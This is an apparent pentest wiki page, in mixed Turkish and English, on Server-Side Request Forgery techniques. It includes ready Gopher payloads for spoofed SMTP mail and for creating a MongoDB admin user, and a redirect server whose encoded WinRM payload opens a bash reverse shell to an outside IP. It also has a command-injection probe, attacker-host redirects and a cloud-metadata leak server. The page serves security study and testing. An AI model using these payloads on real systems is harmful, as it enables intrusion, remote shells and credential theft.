# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgi

A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

## SSRF Yakalama

İlk yapmanız gereken, sizin tarafınızdan oluşturulan bir SSRF etkileşimini yakalamaktır. Bir HTTP veya DNS etkileşimini yakalamak için şu araçları kullanabilirsiniz:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Beyaz Listedeki Domainleri Atlatma

Genellikle SSRF'in yalnızca belirli beyaz listeye alınmış domainlerde veya URL'lerde çalıştığını görürsünüz. Aşağıdaki sayfada beyaz listeyi atlatmak için denenecek tekniklerin bir derlemesi bulunuyor:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Open Redirect ile Atlatma

Sunucu doğru şekilde korunmuş olsa bile, bir web sayfası içindeki bir Open Redirect'i suistimal ederek tüm kısıtlamaları atlayabilirsiniz. Çünkü web sayfası aynı domaine yönelik SSRF'e izin verecek ve muhtemelen yönlendirmeleri takip edecektir; Open Redirect'i kullanarak sunucunun herhangi bir dahili kaynağa erişmesini sağlayabilirsiniz.\
Detaylı bilgi: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokoller

- **file://**
- URL şeması `file://` belirtilmiş, doğrudan `/etc/passwd`'e işaret ediyor: `file:///etc/passwd`
- **dict://**
- DICT URL şeması, DICT protokolü üzerinden tanımlara veya kelime listelerine erişmek için kullanıldığı şekilde açıklanıyor. Verilen örnek, belirli bir kelimeyi, veritabanını ve giriş numarasını hedefleyen oluşturulmuş bir URL'yi gösteriyor; ayrıca bir PHP skriptinin, saldırgan tarafından sağlanan kimlik bilgileri kullanılarak bir DICT sunucusuna bağlanmak için kötüye kullanılabileceğine dair bir örnek var: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Secure shell üzerinden güvenli dosya transferi için bir protokol olarak tanımlanmış; bir PHP skriptinin kötü amaçlı bir SFTP sunucusuna bağlanmak için nasıl suistimal edilebileceğini gösteren bir örnek sağlanmış: `url=sftp://generic.com:11111/`
- **TFTP://**
- UDP üzerinden çalışan Trivial File Transfer Protocol'den bahsedilmiş; bir PHP skriptinin bir TFTP sunucusuna istek göndermek için tasarlandığı bir örnek verilmiş. 'generic.com' adresine '12346' portundan 'TESTUDPPACKET' dosyası için bir TFTP isteği yapılır: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Lightweight Directory Access Protocol'ü kapsar; IP ağları üzerinden dağıtık dizin bilgi hizmetlerini yönetmek ve erişmek için kullanımı vurgulanır. Localhost'taki bir LDAP sunucusuyla etkileşim: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- SSRF açıklarını kullanarak localhost'taki SMTP servisleriyle etkileşimde bulunmaya yönelik bir yöntem tarif edilir; iç domain adlarını ortaya çıkarma ve bu bilgiye dayanarak daha fazla araştırma adımları içerir.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Eğer SSRF **curl** ile çalıştırılıyorsa, curl'in [**URL globbing**](https://everything.curl.dev/cmdline/globbing) adında bir özelliği vardır; bu, WAF'ları atlatmak için faydalı olabilir. Örneğin bu [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) içinde **path traversal via `file` protocol** için şu örneği bulabilirsiniz:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher protokolünün sunucuyla iletişim için IP, port ve bytes belirtme yeteneği ele alınır; payload oluşturmak için Gopherus ve remote-method-guesser gibi araçlara değinilir. İki farklı kullanım örneklendirilir:

### Gopher://

Bu protokolü kullanarak sunucunun **IP, port and bytes** belirtip sunucunun bunları **göndermesini** sağlayabilirsiniz. Böylece, temelde bir SSRF'i suistimal ederek **herhangi bir TCP sunucusuyla iletişim kurabilirsiniz** (ancak önce servise nasıl konuşulacağını bilmeniz gerekir).\
Neyse ki, [Gopherus](https://github.com/tarunkant/Gopherus) birkaç servis için payloads oluşturmakta kullanılabilir. Ayrıca, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) _gopher_ payloads oluşturmak için _Java RMI_ servislerinde kullanılabilir.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — 1337'e geri bağlanma**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin, password=admin123 ve permission=administrator olarak kullanıcı oluştur
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF Referrer header aracılığıyla & Diğerleri

Sunuculardaki analitik yazılımlar genellikle gelen bağlantıları takip etmek için Referrer header'ını kaydeder; bu uygulama istemeden uygulamaları Server-Side Request Forgery (SSRF) zafiyetlerine maruz bırakır. Bunun nedeni, bu tür yazılımların referral site içeriğini analiz etmek için Referrer header'ında belirtilen dış URL'leri ziyaret edebilmesidir. Bu zafiyetleri ortaya çıkarmak için, analytics araçlarının Referer header'ını işleme şeklinden yararlanarak potansiyel SSRF saldırı yüzeylerini tespit eden Burp Suite eklentisi **Collaborator Everywhere** önerilir.

## SSRF Sertifikadan SNI verisi aracılığıyla

Basit bir kurulumla herhangi bir backend'e bağlantıya izin verebilecek bir yanlış yapılandırma, örnek bir Nginx konfigürasyonu ile gösterilmiştir:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Bu yapılandırmada, Server Name Indication (SNI) alanındaki değer doğrudan backend adresi olarak kullanılır. Bu düzenleme, SNI alanına istenen IP adresi veya alan adının girilmesiyle doğrudan Server-Side Request Forgery (SSRF) açığına yol açar. Aşağıda, `openssl` komutunu kullanarak `internal.host.com` gibi rastgele bir backenda bağlantı zorlamak için bir exploitation örneği verilmiştir:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Some TLS stacks will auto-download missing intermediate CAs using the **Authority Information Access (AIA) → CA Issuers** URI inside the peer certificate. In **Java**, enabling `-Dcom.sun.security.enableAIAcaIssuers=true` while running an mTLS service makes the server dereference attacker-controlled URIs from the client certificate **during the handshake**, before any HTTP logic runs.

- **Gereksinimler**: mTLS etkin, Java AIA fetching etkin, saldırgan AIA CA Issuers URI'si hazırlanmış bir istemci sertifikası sunabilir.
- **Triggering SSRF** (Java 21 örneği):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
The Java certpath debug output shows `CertStore URI:http://localhost:8080`, and `nc` captures the HTTP request with the controllable `User-Agent` from `-Dhttp.agent`, proving SSRF during certificate validation.
- **DoS via file://**: AIA CA Issuers'i Unix-benzeri sistemlerde `file:///dev/urandom` olarak ayarlamak, Java'nın bunu bir CertStore olarak işlemesine ve sınırsız rastgele bayt okumasına yol açar; bu CPU çekirdeğini meşgul eder ve istemci bağlantıyı kapatsa bile sonraki bağlantıları engeller.

## SSRF via CSS Pre-Processors

LESS is a popular CSS pre-processor that adds variables, mixins, functions and the powerful `@import` directive. During compilation the LESS engine will **fetch the resources referenced in `@import`** statements and embed ("inline") their contents into the resulting CSS when the `(inline)` option is used.

Nasıl exploit edileceğini görmek için:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Şu tür bir payload denemeye değer olabilir: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

If the web page is automatically creating a PDF with some information you have provided, you can **insert some JS that will be executed by the PDF creator** itself (the server) while creating the PDF and you will be able to abuse a SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

Eğer web sayfası sağladığınız bazı bilgilerle otomatik olarak bir PDF oluşturuyorsa, PDF oluşturulurken PDF creator'ün (sunucunun) kendisi tarafından çalıştırılacak **bir miktar JS** ekleyebilir ve böylece SSRF'yi kötüye kullanabilirsiniz. [**Daha fazla bilgi için bakın**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Birkaç oturum oluşturun ve oturumlardaki SSRF'i kullanarak büyük dosyalar indirmeyi deneyin.

## SSRF PHP Functions

Aşağıdaki sayfada savunmasız PHP ve hatta Wordpress fonksiyonlarını kontrol edin:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

For some exploitations you might need to **send a redirect response** (potentially to use a different protocol like gopher). Here you have different python codes to respond with a redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## SSRF'e yol açan yanlış yapılandırılmış proxy'ler

İpuçları [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy zafiyetli kodu</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask, başlangıç karakteri olarak **`@`** kullanılmasına izin verir; bu, **initial host name the username** yapıp yeni bir tane enjekte etmeye olanak sağlar. Saldırı isteği:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Zayıf kod:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Bir isteğin **yolunu başlatmanın** `;` karakteri ile mümkün olduğu keşfedildi; bu, daha sonra `@` kullanılarak erişilecek yeni bir host'un enjekte edilmesine olanak tanıyor. Saldırı isteği:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Zafiyetli PHP kodu</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP, URL yolunda bir eğik çizgiden önce **karakter `*` kullanımına** izin verir; ancak bunun sadece kök yol adı `/` için geçerli olması ve ilk eğik çizgiden önce noktaların `.` izin verilmemesi gibi başka sınırlamaları vardır; bu nedenle örneğin noktasız-hex kodlu bir IP adresi kullanmak gerekir:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

CORS/SOP nedeniyle **yerel bir IP'den içerik exfiltrate etmekte** **sorun** yaşıyorsanız, **DNS Rebidding** bu sınırlamayı atlatmak için kullanılabilir:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) bir [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) saldırısı gerçekleştirmek için kullanılan bir araçtır. Saldırganın DNS adının IP adresini hedef makinenin IP adresine rebind etmek ve hedef makinedeki zafiyetli yazılımları exploit etmek için attack payload'larını sunmak üzere gerekli bileşenleri içerir.

Ayrıca [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html) adresinde çalışan herkese açık sunucuyu da inceleyin.

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Kullanıcı/bot'tan saldırganın kontrol ettiği bir **domain**e **access** etmesini isteyin.
2. **DNS**'in **TTL** değeri **0** sn olacak (böylece hedef domain'in IP'sini yakında tekrar kontrol eder).
3. Hedef ile saldırganın domain'i arasında bir **TLS connection** kurulur. Saldırgan **payload'u Session ID veya Session Ticket içine** yerleştirir.
4. **Domain**, kendisine karşı **sonsuz bir redirect döngüsü (infinite loop)** başlatır. Amaç, kullanıcı/bot'un domain'e erişmeye devam etmesini sağlamak ve domain için **yeniden** bir **DNS request** yapılana kadar erişimi sürdürtmektir.
5. DNS sorgusunda artık bir **private IP** (ör. 127.0.0.1) döndürülür.
6. Kullanıcı/bot TLS bağlantısını **yeniden kurmaya** çalışacak ve bunu yaparken saldırganın **payload**'ını içerdiği **Session ID/Ticket ID**'yi **gönderecektir**. Tebrikler — kullanıcı/bot'un kendi kendine saldırmasını sağlamayı başardınız.

Not: Bu saldırı sırasında localhost:11211 (_memcache_) gibi bir hedefi attack etmek istiyorsanız, hedefin başlangıç bağlantısını www.attacker.com:11211 ile kurmasını sağlamanız gerekir (port her zaman aynı olmalıdır).\
Bu saldırıyı gerçekleştirmek için şu aracı kullanabilirsiniz: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Daha fazla bilgi için bu saldırının anlatıldığı sunuma bakın: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Blind SSRF ile normal SSRF arasındaki fark, blind durumda SSRF isteğinin yanıtını görememenizdir. Bu nedenle exploit etmek daha zordur; yalnızca iyi bilinen zafiyetleri kullanabilirsiniz.

### Time based SSRF

Sunucudan gelen yanıtların **zamanını kontrol ederek**, bir kaynağın var olup olmadığını **anlamak mümkün olabilir** (var olan bir kaynağa erişmek, olmayan bir kaynağa erişmekten daha uzun sürebilir).

### From blind to full abusing status codes

Bu [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/) a göre, bazı blind SSRF durumları hedef URL 200 status kodu döndürüyor olsa bile (ör. AWS metadata), bu verinin uygun formatta olmaması nedeniyle uygulamanın bunu göstermeyi reddetmesinden kaynaklanabilir.

Ancak, SSRF içinde 305 ile 309 arası bazı redirect cevapları gönderildiğinde, uygulamanın bu redirect'leri takip ederken bir hata moduna girebileceği ve böylece verinin formatını kontrol etmeyi bırakıp doğrudan yazdırabileceği bulunmuştur. Bu durumda uygulama **redirect'leri takip ederken bir hata moduna girer** ve verinin formatını kontrol etmeyi durdurabilir.

Bunu exploit etmek için kullanılan python sunucu aşağıdadır:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Steps:**
- First 302 gets the app to start following.
- Then it receives 305 → 306 → 307 → 308 → 309 → 310.
- After the 5th strange code the PoC finally returns 302 → 169.254.169.254 → 200 OK.

**What happens inside the target:**
- libcurl itself does follow 305–310; it just normalises unknown codes to “follow.”
- After N weird redirects (≥ 5 here) the application’s own wrapper decides “something is off” and switches to an error mode meant for debugging.
- In that mode it dumps the entire redirect chain plus final body back to the outside caller.
- Result: attacker sees every header + the metadata JSON, iş tamam.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### HTML-to-PDF renderers as blind SSRF gadgets

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 her `<img>` kaynağı için birkaç retrieval denemesi yapar, bu yüzden tek bir payload birden fazla istek üretebilir (timing tabanlı port taramaları için faydalı).
- html2pdf TCPDF’nin `<img>` davranışını kopyalar ve `Css::extractStyle()` içinde CSS alma ekler; bu fonksiyon yüzeysel bir scheme kontrolünden sonra sadece `file_get_contents($href)` çağırır. Bunu loopback services, RFC1918 ranges veya cloud metadata endpoints'e istek göndermek için kötüye kullanın.
- Bu SSRF primitive'ini [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) ile birleştirerek hem internal HTTP yanıtlarını hem de PDF'e render edilen local dosyaları leak edin.

Sistem güvenliğini artıranlar, render işleminden önce dış URL'leri kaldırmalı veya renderer'ı bir ağ sandbox'ında izole etmelidir; o zamana kadar PDF oluşturucuları blind SSRF proxy'leri olarak değerlendirin.

## Bulut SSRF İstismarı

Bir makinenin içinde bulunduğu bir cloud ortamında SSRF zafiyeti bulursanız, cloud ortamı hakkında ilginç bilgiler ve hatta kimlik bilgileri elde edebilirsiniz:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF'e Duyarlı Platformlar

